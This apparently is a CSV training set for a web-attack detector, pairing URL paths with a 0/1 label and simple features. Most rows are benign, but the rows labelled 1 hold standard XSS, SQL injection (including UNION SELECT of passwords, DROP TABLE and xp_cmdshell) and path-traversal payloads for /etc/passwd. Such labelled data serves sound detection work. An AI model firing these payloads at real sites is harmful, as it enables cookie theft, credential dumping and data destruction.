payload,label,length,special_chars,keywords
/index.html?category=tech934,0,28,0,0
/login,0,6,0,0
/onload=prompt(1),1,17,2,0
/about,0,6,0,0
/%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1,40,9,3
/contact?category=tech86,0,24,0,0
/dashboard?user=urmit299,0,24,0,0
/'; EXEC xp_cmdshell('dir');--,1,30,7,1
/products/item?user=urmit157,0,28,0,0
/contact?sort=asc993,0,20,0,0
/login?id=1387,0,14,0,0
/checkout,0,9,0,0
/api/users?sort=asc60,0,21,0,0
/products/item?id=1270,0,22,0,0
/login?sort=asc122,0,18,0,0
/login?user=urmit161,0,20,0,0
/api/users?page=2121,0,20,0,0
/about?category=tech557,0,23,0,0
/login,0,6,0,0
/dashboard,0,10,0,0
/index.html?sort=asc309,0,23,0,0
/checkout?category=tech798,0,26,0,0
/login,0,6,0,0
/login?id=1703,0,14,0,0
/contact?id=133,0,15,0,0
/products/item?sort=asc304,0,26,0,0
/dashboard?user=urmit770,0,24,0,0
/index.html?user=urmit964,0,25,0,0
/<script>alert(document.cookie)</script>,1,40,6,3
"/api/users?search="" OR 1=1 --",1,29,1,0
/index.html?search=javascript:eval('var a=1'),1,45,4,1
"/UNION SELECT username, password FROM users",1,43,0,2
/about?id=156,0,13,0,0
/contact?sort=asc787,0,20,0,0
/index.html?id=19,0,17,0,0
/index.html?user=urmit734,0,25,0,0
/contact?category=tech59,0,24,0,0
/contact?id=1314,0,16,0,0
/login?user=urmit236,0,20,0,0
/checkout?user=urmit233,0,23,0,0
/api/users?sort=asc233,0,22,0,0
"/index.html?search="" OR 1=1 --",1,30,1,0
/dashboard,0,10,0,0
/dashboard?sort=asc494,0,22,0,0
/contact?search=javascript:eval('var a=1'),1,42,4,1
/index.html?sort=asc404,0,23,0,0
/index.html?search=<script>alert(document.cookie)</script>,1,58,6,3
/index.html?sort=asc902,0,23,0,0
/about?sort=asc511,0,18,0,0
/?id=1; DROP TABLE users,1,24,1,1
"/dashboard?search="" OR 1=1 --",1,29,1,0
/contact?search=../../../../etc/passwd,1,38,0,0
/api/users?sort=asc737,0,22,0,0
/checkout?user=urmit494,0,23,0,0
/login?category=tech220,0,23,0,0
/api/users?sort=asc889,0,22,0,0
/checkout?page=2807,0,19,0,0
/onload=prompt(1),1,17,2,0
/contact?category=tech103,0,25,0,0
/dashboard,0,10,0,0
/index.html,0,11,0,0
/checkout?category=tech44,0,25,0,0
/checkout,0,9,0,0
/contact?id=1927,0,16,0,0
/contact?user=urmit750,0,22,0,0
/index.html?search=../../../../etc/passwd,1,41,0,0
/contact?id=1930,0,16,0,0
/checkout?id=1137,0,17,0,0
/api/users?category=tech752,0,27,0,0
/products/item?category=tech802,0,31,0,0
/login?page=2457,0,16,0,0
/dashboard?page=2390,0,20,0,0
/../../../../etc/passwd,1,23,0,0
/onload=prompt(1),1,17,2,0
/dashboard,0,10,0,0
/api/users?user=urmit717,0,24,0,0
/login,0,6,0,0
/contact,0,8,0,0
/index.html,0,11,0,0
/dashboard?category=tech956,0,27,0,0
/index.html?id=1931,0,19,0,0
/products/item?page=2468,0,24,0,0
/index.html,0,11,0,0
/login?page=2127,0,16,0,0
/contact?sort=asc995,0,20,0,0
/dashboard?category=tech404,0,27,0,0
/index.html?search=../../../../etc/passwd,1,41,0,0
/contact?page=2460,0,18,0,0
/api/users?sort=asc297,0,22,0,0
/about?id=1585,0,14,0,0
/about?page=2360,0,16,0,0
/about?page=2655,0,16,0,0
/checkout?category=tech433,0,26,0,0
/api/users?search=<script>alert(document.cookie)</script>,1,57,6,3
/checkout?category=tech950,0,26,0,0
/login?category=tech854,0,23,0,0
/dashboard?sort=asc108,0,22,0,0
/about?page=2882,0,16,0,0
/about,0,6,0,0
/contact?page=2903,0,18,0,0
/api/users,0,10,0,0
/index.html?user=urmit160,0,25,0,0
/dashboard?sort=asc443,0,22,0,0
/login?page=258,0,15,0,0
/api/users?search=onload=prompt(1),1,34,2,0
/checkout,0,9,0,0
/dashboard?id=1784,0,18,0,0
/login?search=onload=prompt(1),1,30,2,0
/login?category=tech307,0,23,0,0
/products/item?user=urmit126,0,28,0,0
/dashboard?user=urmit178,0,24,0,0
/api/users?search='; EXEC xp_cmdshell('dir');--,1,47,7,1
/dashboard,0,10,0,0
/login?category=tech244,0,23,0,0
/checkout?category=tech577,0,26,0,0
/dashboard?user=urmit833,0,24,0,0
/' OR '1'='1,1,12,4,0
/about?search=<script>alert(document.cookie)</script>,1,53,6,3
/api/users?id=1285,0,18,0,0
/contact?category=tech405,0,25,0,0
/dashboard?user=urmit613,0,24,0,0
/dashboard?id=1234,0,18,0,0
/contact?id=1316,0,16,0,0
/login?sort=asc328,0,18,0,0
/' OR '1'='1,1,12,4,0
/contact?search=../../../windows/system32/cmd.exe,1,49,0,0
/products/item?id=1640,0,22,0,0
/index.html,0,11,0,0
/?id=1; DROP TABLE users,1,24,1,1
/api/users?id=1305,0,18,0,0
/api/users?page=2415,0,20,0,0
/%3Cscript%3Ealert('XSS')%3C%2Fscript%3E,1,40,9,3
/index.html?id=1462,0,19,0,0
/about?page=2422,0,16,0,0
/api/users,0,10,0,0
/checkout,0,9,0,0
/index.html,0,11,0,0
/contact,0,8,0,0
/products/item?sort=asc714,0,26,0,0
/../../../windows/system32/cmd.exe,1,34,0,0
/<script>alert(document.cookie)</script>,1,40,6,3
/products/item?sort=asc778,0,26,0,0
/checkout?category=tech301,0,26,0,0
/index.html,0,11,0,0
/api/users?page=2592,0,20,0,0
/dashboard?category=tech569,0,27,0,0
/javascript:eval('var a=1'),1,27,4,1
/contact?category=tech428,0,25,0,0
/dashboard?id=1104,0,18,0,0
/products/item?search='; EXEC xp_cmdshell('dir');--,1,51,7,1
/api/users?user=urmit482,0,24,0,0
/login?user=urmit470,0,20,0,0
/contact,0,8,0,0
/products/item?search=<script>alert(document.cookie)</script>,1,61,6,3
/products/item?user=urmit795,0,28,0,0
